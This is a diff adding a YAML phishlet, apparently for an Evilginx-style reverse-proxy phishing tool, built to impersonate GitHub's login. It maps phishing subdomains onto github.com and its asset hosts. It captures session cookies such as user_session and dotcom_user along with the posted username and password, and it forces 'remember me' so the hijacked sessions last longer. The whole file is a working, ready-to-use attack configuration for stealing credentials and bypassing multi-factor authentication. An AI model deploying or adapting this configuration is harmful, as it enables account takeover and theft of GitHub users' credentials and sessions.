@@ -1,0 +1,33 @@
+name: 'github-mfa'
+author: '@H3llKa1ser'
+min_ver: '2.4.0'
+proxy_hosts:
+  - {phish_sub: 'github', orig_sub: '', domain: 'github.com', session: true, is_landing: true}
+  - {phish_sub: 'auth', orig_sub: '', domain: 'github.com', session: true, is_landing: false}
+  - {phish_sub: 'assets', orig_sub: '', domain: 'githubassets.com', session: false, is_landing: false}
+  - {phish_sub: 'avatars', orig_sub: '', domain: 'avatars.githubusercontent.com', session: false, is_landing: false}
+sub_filters:
+auth_tokens:
+  - domain: 'github.com'
+    keys: ['user_session', 'logged_in', '__Host-user_session_same_site', 'dotcom_user']
+  - domain: '.github.com'
+    keys: ['user_session', 'logged_in', 'dotcom_user']
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'github.com'
+  path: '/login'
+force_post:
+  - path: '/session'
+    search:
+      - {key: 'remember_me', search: '.*'}
+    force:
+      - {key: 'remember_me', value: '1'}
+    type: 'post'
